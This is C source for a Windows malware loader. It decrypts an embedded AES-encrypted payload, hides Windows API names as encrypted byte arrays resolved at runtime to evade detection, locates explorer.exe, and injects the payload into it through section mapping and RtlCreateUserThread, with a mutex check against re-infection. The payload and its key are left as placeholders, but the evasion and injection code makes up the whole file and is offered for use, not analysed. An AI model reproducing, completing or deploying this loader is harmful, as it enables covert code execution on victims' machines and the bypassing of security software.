#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include "helpers.h"
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include <Lmcons.h>

#pragma comment(linker, "/entry:WinMain")

// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html
typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef LPVOID (WINAPI * VirtualAlloc_t)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
);
	
typedef VOID (WINAPI * RtlMoveMemory_t)(
	VOID UNALIGNED *Destination, 
	const VOID UNALIGNED *Source, 
	SIZE_T Length
);

typedef FARPROC (WINAPI * RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId
);

typedef NTSTATUS (NTAPI * NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer
);

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	_Field_size_bytes_part_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

// https://processhacker.sourceforge.io/doc/ntbasic_8h_source.html#l00186
typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR;
	PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwcreatesection
// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtCreateSection.html
typedef NTSTATUS (NTAPI * NtCreateSection_t)(
	OUT PHANDLE SectionHandle,
	IN ULONG DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN PLARGE_INTEGER MaximumSize OPTIONAL,
	IN ULONG PageAttributess,
	IN ULONG SectionAttributes,
	IN HANDLE FileHandle OPTIONAL
); 

// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwmapviewofsection
// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtMapViewOfSection.html
typedef NTSTATUS (NTAPI * NtMapViewOfSection_t)(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID * BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect
);
	
// http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FSECTION_INHERIT.html
typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, *PSECTION_INHERIT;	

typedef HMODULE (WINAPI * GetModuleHandleA_t)(
  LPCSTR lpModuleName
);

typedef FARPROC (WINAPI * GetProcAddress_t)(
  HMODULE hModule,
  LPCSTR  lpProcName
);

typedef HANDLE (WINAPI * CreateToolhelp32Snapshot_t)(
  DWORD dwFlags,
  DWORD th32ProcessID
);

typedef BOOL (WINAPI * Process32First_t)(
  HANDLE           hSnapshot,
  LPPROCESSENTRY32 lppe
);

typedef BOOL (WINAPI * Process32Next_t)(
  HANDLE           hSnapshot,
  LPPROCESSENTRY32 lppe
);

typedef HRSRC (WINAPI * FindResourceA_t)(
  HMODULE hModule,
  LPCSTR  lpName,
  LPCSTR  lpType
);

typedef HGLOBAL (WINAPI * LoadResource_t)(
  HMODULE hModule,
  HRSRC   hResInfo
);

typedef LPVOID (WINAPI * LockResource_t)(
  HGLOBAL hResData
);

typedef DWORD (WINAPI * SizeofResource_t)(
  HMODULE hModule,
  HRSRC   hResInfo
);

typedef BOOL (WINAPI * CloseHandle_t)(
  HANDLE hObject
);

typedef DWORD (WINAPI * WaitForSingleObject_t)(
  HANDLE hHandle,
  DWORD  dwMilliseconds
);

typedef HANDLE (WINAPI * OpenProcess_t)(
  DWORD dwDesiredAccess,
  BOOL  bInheritHandle,
  DWORD dwProcessId
);

typedef int (WINAPI * lstrcmpiA_t)(
  LPCSTR lpString1,
  LPCSTR lpString2
);

typedef BOOL (WINAPI * CryptAcquireContextW_t)(
  HCRYPTPROV *phProv,
  LPCWSTR    szContainer,
  LPCWSTR    szProvider,
  DWORD      dwProvType,
  DWORD      dwFlags
);

typedef BOOL (WINAPI * CryptCreateHash_t)(
  HCRYPTPROV hProv,
  ALG_ID     Algid,
  HCRYPTKEY  hKey,
  DWORD      dwFlags,
  HCRYPTHASH *phHash
);

typedef BOOL (WINAPI * CryptHashData_t)(
  HCRYPTHASH hHash,
  const BYTE *pbData,
  DWORD      dwDataLen,
  DWORD      dwFlags
);

typedef BOOL (WINAPI * CryptDeriveKey_t)(
  HCRYPTPROV hProv,
  ALG_ID     Algid,
  HCRYPTHASH hBaseData,
  DWORD      dwFlags,
  HCRYPTKEY  *phKey
);

typedef BOOL (WINAPI * CryptDecrypt_t)(
  HCRYPTKEY  hKey,
  HCRYPTHASH hHash,
  BOOL       Final,
  DWORD      dwFlags,
  BYTE       *pbData,
  DWORD      *pdwDataLen
);

typedef BOOL (WINAPI * CryptReleaseContext_t)(
  HCRYPTPROV hProv,
  DWORD      dwFlags
);

typedef BOOL (WINAPI * CryptDestroyHash_t)(
  HCRYPTHASH hHash
);

typedef BOOL (WINAPI * CryptDestroyKey_t)(
  HCRYPTKEY hKey
);

typedef HANDLE (WINAPI * CreateMutexA_t)(
  LPSECURITY_ATTRIBUTES lpMutexAttributes,
  BOOL                  bInitialOwner,
  LPCSTR                lpName
);

typedef DWORD (WINAPI * GetLastError_t)();

typedef void (WINAPI * memcpy_t)(
   void *dest,
   const void *src,
   size_t count
);

typedef HANDLE (WINAPI * GetCurrentProcess_t)();

// SAVE AES ENCRYPTED PAYLOAD HERE
unsigned char payl[] = <AES PAYLOAD>
unsigned int payl_len = sizeof(payl);

//// PAYLOAD KEY AND KEY FOR STRINGS
unsigned char pkey[] = <PAYLOAD AES KEY>
unsigned char k[] = { 0xae, 0xc, 0xe6, 0xc8, 0xb8, 0x88, 0x4b, 0xf2, 0xed, 0xd, 0x29, 0xdb, 0xbb, 0x72, 0x34, 0xc5 };

//// AES ENCRYPTED FUNCTIONS
unsigned char sOpenProcess[] = { 0x7a, 0x36, 0x23, 0x24, 0xef, 0xe5, 0x98, 0x60, 0xf1, 0xb1, 0xb9, 0x2c, 0x27, 0xfc, 0x15, 0x63 };
unsigned char sFindResourceA[] = { 0x41, 0x3a, 0x32, 0xd6, 0xfb, 0x76, 0x9b, 0xbd, 0x12, 0x50, 0xbf, 0xbb, 0xa5, 0x78, 0x3e, 0x25 };
unsigned char sLoadResource[] = { 0xd2, 0x86, 0xe0, 0xb4, 0x22, 0x4c, 0xea, 0x7a, 0xcd, 0x91, 0x28, 0x6d, 0xa1, 0xc7, 0x78, 0xc5 };
unsigned char sLockResource[] = { 0xdc, 0xcb, 0x3e, 0x73, 0xe7, 0x15, 0xf2, 0xe3, 0x60, 0x18, 0x9a, 0xe1, 0x10, 0x6b, 0x17, 0x7a };
unsigned char sSizeofResource[] = { 0xb8, 0x44, 0x73, 0xe4, 0x8f, 0xd9, 0xaa, 0x86, 0xf1, 0x4c, 0x3e, 0xd7, 0xd5, 0xbe, 0x7b, 0xe8 };
unsigned char sVirtualAlloc[] = { 0x8c, 0xe0, 0x58, 0xf3, 0x5, 0x72, 0x2c, 0x52, 0x3b, 0xb9, 0x16, 0x28, 0x65, 0x6f, 0x8f, 0x62 };
unsigned char sRtlMoveMemory[] = { 0xb7, 0x80, 0x63, 0xbd, 0x11, 0x39, 0x69, 0x80, 0xa9, 0x39, 0xba, 0x21, 0xd7, 0xa9, 0x1b, 0xa5 };
unsigned char sWaitForSingleObject[] = { 0x66, 0x48, 0xa1, 0xe4, 0x1c, 0x1e, 0x6b, 0x65, 0xd8, 0xd2, 0x97, 0x91, 0x11, 0x15, 0x85, 0xff, 0x75, 0xa6, 0xe, 0x5f, 0x64, 0xaa, 0xfa, 0x91, 0x52, 0x83, 0xf6, 0x6c, 0x92, 0xac, 0x2b, 0xa3 };
unsigned char sCloseHandle[] = { 0x59, 0xda, 0x4d, 0x85, 0xcc, 0x62, 0x72, 0xf2, 0x6b, 0xfe, 0x38, 0xbf, 0x7a, 0xac, 0x2a, 0xcb };
unsigned char sProcess32First[] = { 0xe7, 0x8e, 0x55, 0xc1, 0x7e, 0x1b, 0x9b, 0x14, 0x72, 0x85, 0xc9, 0x5, 0xd7, 0x72, 0x3a, 0xed };
unsigned char sProcess32Next[] = { 0xd0, 0xc6, 0xc, 0xc5, 0xa9, 0x34, 0x77, 0xf0, 0x5, 0xaa, 0x72, 0x13, 0xbd, 0xff, 0x39, 0xc4 };
unsigned char slstrcmpiA[] = { 0x39, 0x9, 0x3c, 0xf, 0x64, 0x31, 0x4e, 0x25, 0xd6, 0xd9, 0xc5, 0x8a, 0x34, 0x2b, 0x4f, 0xb };
unsigned char sCreateMutexA[] = { 0x9b, 0xf7, 0xbb, 0x62, 0xdb, 0xab, 0xf3, 0xaa, 0x4b, 0x45, 0x94, 0x29, 0xa1, 0xde, 0xea, 0xcb };
unsigned char sGetLastError[] = { 0x6c, 0xf6, 0x7e, 0xf2, 0x67, 0x27, 0xa6, 0x51, 0x9f, 0x56, 0xaf, 0xfa, 0x1c, 0xdd, 0x6, 0xcf };
unsigned char sNtCreateSection [] = { 0xa, 0xb5, 0x9f, 0x12, 0xe5, 0xef, 0x3a, 0x6f, 0x3f, 0x43, 0x87, 0x45, 0x49, 0x7a, 0xd3, 0x10, 0xf7, 0x4f, 0x59, 0x72, 0x2e, 0xee, 0xaf, 0xf, 0x5a, 0x14, 0xef, 0xdf, 0x3f, 0x6b, 0xee, 0xe6 };
unsigned char sNtMapViewOfSection [] = { 0x26, 0x32, 0x8f, 0x19, 0x26, 0x51, 0xf7, 0xef, 0x96, 0x74, 0x80, 0x76, 0xf9, 0x61, 0x79, 0x3b, 0xe7, 0xcd, 0x10, 0xda, 0x78, 0x20, 0x66, 0xa2, 0xfe, 0xc1, 0x7e, 0x7d, 0x8d, 0xb3, 0x6a, 0x11 };
unsigned char sRtlCreateUserThread [] = { 0x3a, 0x8f, 0xae, 0xcc, 0x93, 0xe8, 0xb2, 0x41, 0xb4, 0xac, 0x7a, 0xaa, 0x10, 0xfd, 0xdb, 0x18, 0x24, 0xab, 0x2a, 0x7b, 0x2c, 0xab, 0xcf, 0x74, 0xb4, 0x17, 0xfc, 0x9a, 0xe4, 0xb9, 0xd9, 0x12 };
unsigned char smemcpy [] = { 0x41, 0xe4, 0x27, 0x85, 0x6e, 0x19, 0x35, 0x1, 0xb9, 0x93, 0x25, 0xc3, 0x66, 0xa4, 0x72, 0xdf };
unsigned char sGetCurrentProcess[] = { 0xe1, 0x58, 0x7, 0xb0, 0x32, 0x18, 0xbb, 0x7c, 0x2b, 0x3d, 0x3c, 0x7, 0xfe, 0x36, 0x33, 0x9, 0xb1, 0x42, 0xad, 0xc3, 0x3b, 0x87, 0x31, 0x37, 0x30, 0xd0, 0x1d, 0xe7, 0x45, 0x36, 0x5f, 0x5b };
unsigned char sSleep[] = { 0xa8, 0x4f, 0x90, 0xd5, 0x52, 0xbb, 0x8b, 0x44, 0x7f, 0x17, 0xd9, 0x62, 0x3c, 0x63, 0xa1, 0x7a };
unsigned char sCreateToolhelp32Snapshot[] = { 0x71, 0xd7, 0x43, 0x1d, 0xbd, 0xd2, 0x43, 0xe4, 0xbe, 0x37, 0xfd, 0x94, 0x1c, 0xdb, 0x75, 0x1b, 0x92, 0x90, 0xda, 0x23, 0xba, 0xb3, 0x32, 0xa5, 0xae, 0x1f, 0x53, 0xdf, 0xf2, 0xca, 0x69, 0xa4 };

//// AES ENCRYPTED STRINGS
unsigned char sKdll[] = { 0x2b, 0x6d, 0x88, 0xa1, 0x83, 0xe8, 0x5c, 0xb1, 0xc9, 0x18, 0xb7, 0xea, 0x42, 0x83, 0x3f, 0x6d }; //kernel32.dll
unsigned char sNdll[] = { 0x59, 0xda, 0x3d, 0xaf, 0x55, 0x64, 0xa4, 0xec, 0xd1, 0x9, 0xa9, 0xbd, 0x85, 0x42, 0xcc, 0xcb }; //Ntdll.dll
unsigned char sPrNa[] = { 0x3e, 0x32, 0x8f, 0xa3, 0x1b, 0xfa, 0x90, 0x47, 0x7, 0xde, 0x4, 0x51, 0x95, 0x8c, 0x93, 0x77 }; //Explorer.exe
unsigned char sMdll[] = { 0xe5, 0x68, 0x97, 0xdc, 0x27, 0x2e, 0x30, 0xbf, 0x3, 0xb4, 0x5a, 0x75, 0x1a, 0x11, 0x1c, 0x44 }; //msvcrt.dll

int AESDecrypt(char * payl, unsigned int payl_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;
		
		// Get handles and pointer to normal GetModuleHandle with our hlpGetProcAddress from helpers.h
		GetModuleHandleA_t pGetModuleHandleA = (GetModuleHandleA_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetModuleHandleA");
		GetProcAddress_t pGetProcAddress = (GetProcAddress_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetProcAddress");
		
		CryptAcquireContextW_t pCryptAcquireContextW = (CryptAcquireContextW_t) pGetProcAddress(pGetModuleHandleA("Advapi32.dll"), "CryptAcquireContextW");
		CryptCreateHash_t pCryptCreateHash = (CryptCreateHash_t) pGetProcAddress(pGetModuleHandleA("Advapi32.dll"), "CryptCreateHash");
		CryptHashData_t pCryptHashData = (CryptHashData_t) pGetProcAddress(pGetModuleHandleA("Advapi32.dll"), "CryptHashData");
		CryptDeriveKey_t pCryptDeriveKey = (CryptDeriveKey_t) pGetProcAddress(pGetModuleHandleA("Advapi32.dll"), "CryptDeriveKey");
		CryptDecrypt_t pCryptDecrypt = (CryptDecrypt_t) pGetProcAddress(pGetModuleHandleA("Advapi32.dll"), "CryptDecrypt");
		CryptDestroyHash_t pCryptDestroyHash = (CryptDestroyHash_t) pGetProcAddress(pGetModuleHandleA("Advapi32.dll"), "CryptDestroyHash");
		CryptDestroyKey_t pCryptDestroyKey = (CryptDestroyKey_t) pGetProcAddress(pGetModuleHandleA("Advapi32.dll"), "CryptDestroyKey");

        if (!pCryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!pCryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!pCryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!pCryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
		if (!pCryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payl, (DWORD *) &payl_len)){
			return -1;
		}
        
		CryptReleaseContext_t pCryptReleaseContext = (CryptReleaseContext_t) pGetProcAddress(pGetModuleHandleA("Advapi32.dll"), "CryptReleaseContext"); //this one needs to stand here otherwise it wont work?
        pCryptReleaseContext(hProv, 0);
        pCryptDestroyHash(hHash);
        pCryptDestroyKey(hKey);
        
        return 0;
}

int GePr(const char *pname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
		
		// AES decrypt windows API strings
		AESDecrypt((char *) sProcess32First, sizeof(sProcess32First), (char *) k, sizeof(k));
		AESDecrypt((char *) sProcess32Next, sizeof(sProcess32Next), (char *) k, sizeof(k));
		AESDecrypt((char *) slstrcmpiA, sizeof(slstrcmpiA), (char *) k, sizeof(k));
		AESDecrypt((char *) sCreateToolhelp32Snapshot, sizeof(sCreateToolhelp32Snapshot), (char *) k, sizeof(k));
		
		// Get handles and pointer to normal GetModuleHandle with our hlpGetProcAddress from helpers.h
		GetModuleHandleA_t pGetModuleHandleA = (GetModuleHandleA_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetModuleHandleA");
		GetProcAddress_t pGetProcAddress = (GetProcAddress_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetProcAddress");
		
		// Get the other handles using pGetModuleHandleA and pGetProcAddress
		Process32First_t pProcess32First = (Process32First_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sProcess32First);
		Process32Next_t pProcess32Next = (Process32Next_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sProcess32Next);
		CloseHandle_t pCloseHandle = (CloseHandle_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sCloseHandle);
		lstrcmpiA_t plstrcmpiA = (lstrcmpiA_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) slstrcmpiA);
		
		CreateToolhelp32Snapshot_t pCreateToolhelp32Snapshot = (CreateToolhelp32Snapshot_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sCreateToolhelp32Snapshot); //this one needs to stand here otherwise it wont work?
        hProcSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!pProcess32First(hProcSnap, &pe32)) {
                pCloseHandle(hProcSnap);
                return 0;
        }
                
        while (pProcess32Next(hProcSnap, &pe32)) {
                if (plstrcmpiA(pname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        pCloseHandle(hProcSnap);
                
        return pid;
}

int InjectVIEW(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	HANDLE hSection = NULL;
	PVOID pLocalView = NULL, pRemoteView = NULL;
	HANDLE hThread = NULL;
	CLIENT_ID cid;
	
	// Get handles and pointer to normal GetModuleHandle with our hlpGetProcAddress from helpers.h
	GetModuleHandleA_t pGetModuleHandleA = (GetModuleHandleA_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetModuleHandleA");
	GetProcAddress_t pGetProcAddress = (GetProcAddress_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetProcAddress");
	
	// grouping the method for getting the pointers to the API's doesn't work for some reason. Weird behavior!
	
	// create memory section
	NtCreateSection_t pNtCreateSection = (NtCreateSection_t) pGetProcAddress(pGetModuleHandleA((char *) sNdll), (char *) sNtCreateSection);
	if (pNtCreateSection == NULL)
		return -2;
	pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER) &payload_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

	// create local section view
	NtMapViewOfSection_t pNtMapViewOfSection = (NtMapViewOfSection_t) pGetProcAddress(pGetModuleHandleA((char *) sNdll), (char *) sNtMapViewOfSection);
	if (pNtMapViewOfSection == NULL)
		return -2;
	GetCurrentProcess_t pGetCurrentProcess= (GetCurrentProcess_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sGetCurrentProcess);
	pNtMapViewOfSection(hSection, pGetCurrentProcess(), &pLocalView, NULL, NULL, NULL, (SIZE_T *) &payload_len, ViewUnmap, NULL, PAGE_READWRITE);

	// throw the payload into the section
	memcpy_t pmemcpy = (memcpy_t) pGetProcAddress(pGetModuleHandleA((char *) sMdll), (char *) smemcpy);
	pmemcpy(pLocalView, payload, payload_len);
	
	// create remote section view (target process)
	pNtMapViewOfSection(hSection, hProc, &pRemoteView, NULL, NULL, NULL, (SIZE_T *) &payload_len, ViewUnmap, NULL, PAGE_EXECUTE_READ);

	// execute the payload
	RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t) pGetProcAddress(pGetModuleHandleA((char *) sNdll), (char *) sRtlCreateUserThread);
	if (pRtlCreateUserThread == NULL)
		return -2;
	pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, pRemoteView, 0, &hThread, &cid);
	if (hThread != NULL) {
			WaitForSingleObject_t pWaitForSingleObject = (WaitForSingleObject_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sWaitForSingleObject);
			pWaitForSingleObject(hThread, 500);
			CloseHandle_t pCloseHandle = (CloseHandle_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sCloseHandle);
			pCloseHandle(hThread);
			return 0;
	}
	return -1;
}

HANDLE hSync;
#define SYNCER "Global\\SyncMe"
#define PIPENAME "\\\\.\\pipe\\SyncMe"
#define MUTEX 1
#define EVENT 2
#define SEMAPH 3
#define PIPE 4

BOOL IsPayloadRunning(int method) {

	BOOL ret = FALSE;
	
	// Get handles and pointer to normal GetModuleHandle with our hlpGetProcAddress from helpers.h
	GetModuleHandleA_t pGetModuleHandleA = (GetModuleHandleA_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetModuleHandleA");
	GetProcAddress_t pGetProcAddress = (GetProcAddress_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetProcAddress");
	
	AESDecrypt((char *) sCreateMutexA, sizeof(sCreateMutexA), (char *) k, sizeof(k));
	AESDecrypt((char *) sGetLastError, sizeof(sGetLastError), (char *) k, sizeof(k));
	AESDecrypt((char *) sCloseHandle, sizeof(sCloseHandle), (char *) k, sizeof(k));
	
	CreateMutexA_t pCreateMutexA = (CreateMutexA_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sCreateMutexA);
	GetLastError_t pGetLastError = (GetLastError_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sGetLastError);
	CloseHandle_t pCloseHandle = (CloseHandle_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sCloseHandle);
	
	// use global mutant
	if (method == MUTEX) {
		hSync = pCreateMutexA(NULL, FALSE, SYNCER);

		if (pGetLastError() == ERROR_ALREADY_EXISTS) {
			pCloseHandle(hSync);
			ret = TRUE;
		}
	}
	
	return ret;
}

//int main(void) {
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
    LPSTR lpCmdLine, int nCmdShow) {

	// Get handles and pointer to normal GetModuleHandle with our hlpGetProcAddress from helpers.h
	GetModuleHandleA_t pGetModuleHandleA = (GetModuleHandleA_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetModuleHandleA");
	GetProcAddress_t pGetProcAddress = (GetProcAddress_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetProcAddress");
	
	int pid = 0;
    HANDLE hProc = NULL;
	
	// AES decrypt dll strings
	AESDecrypt((char *) sKdll, sizeof(sKdll), (char *) k, sizeof(k));
	AESDecrypt((char *) sNdll, sizeof(sNdll), (char *) k, sizeof(k));
	AESDecrypt((char *) sPrNa, sizeof(sPrNa), (char *) k, sizeof(k));
	AESDecrypt((char *) sMdll, sizeof(sMdll), (char *) k, sizeof(k));
	
	// Check if the payload is already running on the machine
	if (IsPayloadRunning(MUTEX)) {
		return 0;
	}
	
	// AES decrypt windows API strings
	AESDecrypt((char *) sFindResourceA, sizeof(sFindResourceA), (char *) k, sizeof(k));
	AESDecrypt((char *) sLoadResource, sizeof(sLoadResource), (char *) k, sizeof(k));
	AESDecrypt((char *) sLockResource, sizeof(sLockResource), (char *) k, sizeof(k));
	AESDecrypt((char *) sSizeofResource, sizeof(sSizeofResource), (char *) k, sizeof(k));
	AESDecrypt((char *) sVirtualAlloc, sizeof(sVirtualAlloc), (char *) k, sizeof(k));
	AESDecrypt((char *) sOpenProcess, sizeof(sOpenProcess), (char *) k, sizeof(k));
	AESDecrypt((char *) sRtlMoveMemory, sizeof(sRtlMoveMemory), (char *) k, sizeof(k));
	
	// AES decrypt windows API strings for MAPVIEW
	AESDecrypt((char *) sNtCreateSection, sizeof(sNtCreateSection), (char *) k, sizeof(k));
	AESDecrypt((char *) sNtMapViewOfSection, sizeof(sNtMapViewOfSection), (char *) k, sizeof(k));
	AESDecrypt((char *) sRtlCreateUserThread, sizeof(sRtlCreateUserThread), (char *) k, sizeof(k));
	AESDecrypt((char *) smemcpy, sizeof(smemcpy), (char *) k, sizeof(k));
	AESDecrypt((char *) sGetCurrentProcess, sizeof(sGetCurrentProcess), (char *) k, sizeof(k));
	AESDecrypt((char *) sSleep, sizeof(sSleep), (char *) k, sizeof(k));
	
	// Get the other handles using pGetModuleHandleA and pGetProcAddress
	FindResourceA_t pFindResourceA = (FindResourceA_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sFindResourceA);
	LoadResource_t pLoadResource = (LoadResource_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sLoadResource);
	LockResource_t pLockResource = (LockResource_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sLockResource);
	SizeofResource_t pSizeofResource = (SizeofResource_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sSizeofResource);
	VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sVirtualAlloc);
	OpenProcess_t pOpenProcess = (OpenProcess_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sOpenProcess);
	RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t) pGetProcAddress(pGetModuleHandleA((char *) sNdll), (char *) sRtlMoveMemory);
	CloseHandle_t pCloseHandle = (CloseHandle_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sCloseHandle);
	
	// Inject process starts here...
	pid = GePr((char *) sPrNa);
	
	if (pid) {
		// try to open target process
		hProc = pOpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			AESDecrypt((char *) payl, payl_len, (char *) pkey, sizeof(pkey));
			InjectVIEW(hProc, payl, payl_len);
			pCloseHandle(hProc);
		}
	}
	
	TCHAR username[UNLEN + 1];
	DWORD size = UNLEN + 1;
	GetUserName((TCHAR*)username, &size);

	return 0;
}